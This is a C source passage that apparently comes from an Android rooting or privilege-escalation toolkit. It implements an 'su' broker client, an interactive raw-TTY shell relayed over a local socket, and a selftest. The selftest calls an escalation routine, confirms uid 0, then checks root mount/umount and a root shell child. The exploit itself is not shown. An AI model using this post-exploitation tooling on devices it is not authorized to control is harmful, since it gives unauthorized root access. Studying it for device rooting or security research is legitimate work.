static int su_client_once(const char *line, char *out, size_t outlen) {
  int fd = su_connect();
  if (fd < 0) {
    pr_warning("su: connect @gl_su errno=%d\n", errno);
    return 0;
  }
  char request[4096];
  size_t rn = snprintf(request, sizeof(request), "%s\n", line);
  if (rn >= sizeof(request)) {
    close(fd);
    return 0;
  }
  if (write(fd, request, rn) != (ssize_t)rn) {
    pr_warning("su: write errno=%d\n", errno);
    close(fd);
    return 0;
  }
  shutdown(fd, SHUT_WR);
  size_t used = 0;
  for (;;) {
    if (used >= outlen - 1) {
      break;
    }
    ssize_t n = read(fd, out + used, outlen - 1 - used);
    if (n <= 0) {
      break;
    }
    used += (size_t)n;
  }
  out[used] = 0;
  close(fd);
  return 1;
}

int su_run_client(const char *cmd) {
  char buf[4096];
  if (!su_client_once(cmd, buf, sizeof(buf))) {
    return 0;
  }
  fputs(buf, stdout);
  return 1;
}

static int su_write_all(int fd, const char *buf, size_t len) {
  while (len) {
    ssize_t n = write(fd, buf, len);
    if (n < 0) {
      if (errno == EINTR) {
        continue;
      }
      return 0;
    }
    if (n == 0) {
      return 0;
    }
    buf += n;
    len -= (size_t)n;
  }
  return 1;
}

int su_run_shell_client(void) {
  if (!isatty(0)) {
    dprintf(2, "su shell: no local TTY; use: adb shell -t ... --rsh-shell\n");
  }
  int fd = su_connect();
  if (fd < 0) {
    pr_warning("su shell: connect @gl_su errno=%d\n", errno);
    return 0;
  }

  struct winsize ws;
  memset(&ws, 0, sizeof(ws));
  if (ioctl(0, TIOCGWINSZ, &ws) != 0) {
    ws.ws_row = 24;
    ws.ws_col = 80;
  }
  char request[96];
  int rn = snprintf(request, sizeof(request), "GLSHELL|%u|%u\n",
                    (unsigned)ws.ws_row, (unsigned)ws.ws_col);
  if (rn <= 0 || (size_t)rn >= sizeof(request) ||
      !su_write_all(fd, request, (size_t)rn)) {
    pr_warning("su shell: request write errno=%d\n", errno);
    close(fd);
    return 0;
  }

  struct termios saved;
  int raw = isatty(0) && tcgetattr(0, &saved) == 0;
  if (raw) {
    struct termios t = saved;
    cfmakeraw(&t);
    if (tcsetattr(0, TCSAFLUSH, &t) != 0) {
      raw = 0;
    }
  }

  char buf[4096];
  int stdin_open = 1;
  for (;;) {
    struct pollfd pf[2] = {
      {.fd = 0, .events = POLLIN},
      {.fd = fd, .events = POLLIN},
    };
    int rc = poll(pf, stdin_open ? 2 : 1, -1);
    if (rc < 0) {
      if (errno == EINTR) {
        continue;
      }
      break;
    }
    if (stdin_open && pf[0].revents & (POLLIN | POLLHUP | POLLERR)) {
      ssize_t n = read(0, buf, sizeof(buf));
      if (n > 0) {
        if (!su_write_all(fd, buf, (size_t)n)) {
          break;
        }
      } else {
        shutdown(fd, SHUT_WR);
        stdin_open = 0;
      }
    }
    if (pf[1].revents & (POLLIN | POLLHUP | POLLERR)) {
      ssize_t n = read(fd, buf, sizeof(buf));
      if (n > 0) {
        if (!su_write_all(1, buf, (size_t)n)) {
          break;
        }
      } else {
        break;
      }
    }
  }
  close(fd);
  if (raw) {
    (void)tcsetattr(0, TCSAFLUSH, &saved);
  }
  return 1;
}

/* ------------------------------------------------------------------ */
/* selftest: escalate, serve, then drive the server from this process  */

static int su_expect(const char *line, const char *want) {
  char buf[4096];
  if (!su_client_once(line, buf, sizeof(buf))) {
    return 0;
  }
  int ok = strstr(buf, want) != NULL;
  char one[200];
  size_t cl = strnlen(buf, sizeof(one) - 1);
  memcpy(one, buf, cl);
  one[cl] = 0;
  char *nl = strchr(one, '\n');
  if (nl) {
    *nl = 0;
  }
  pr_info("su selftest: %-46s -> %s [%s]\n", line, ok ? "ok" : "MISMATCH", one);
  return ok;
}

int su_run_selftest(void) {
  int rooted = g_opts.simple_root ? slide_run_simple_root()
                                  : slide_run_escalate();
  if (!rooted) {
    pr_warning("su selftest: root path failed\n");
    return 0;
  }
  pr_success("su selftest: rooted uid=%d euid=%d\n", (int)getuid(),
             (int)geteuid());

  int lfd = su_listen();
  if (lfd < 0) {
    return 0;
  }
  pid_t srv = fork();
  if (srv == 0) {
    close(0);
    close(1);
    close(2);
    _exit(su_serve(lfd, 5) ? 0 : 1);
  }
  close(lfd);
  usleep(200000);

  const char *dir = "/data/local/tmp/glsvc";
  mkdir(dir, 0755);
  char mnt[160];
  snprintf(mnt, sizeof(mnt), "GLMOUNT|-|%s|tmpfs|0|mode=0755", dir);
  char umnt[160];
  snprintf(umnt, sizeof(umnt), "GLUMOUNT|%s|0", dir);

  int ok = 1;
  ok &= su_expect("STATUS", "uid=0 euid=0");
  ok &= su_expect(mnt, "rc=0");
  ok &= su_expect(umnt, "rc=0");
  /* Generic path: everything that is not a broker verb goes to the server's
     shell, and the child must inherit the server's root creds.  Works with
     /system/bin/sh on the device and with tools/qemu-test/glsh.c in QEMU
     (--shell /glsh). */
  ok &= su_expect("id", "uid=0");
  if (ok) {
    pr_success("su selftest PASSED (status + broker mount/umount + shell "
               "child as uid 0)\n");
  } else {
    pr_warning("su selftest FAILED\n");
  }

  kill(srv, SIGKILL);
  waitpid(srv, NULL, 0);
  return ok;
}
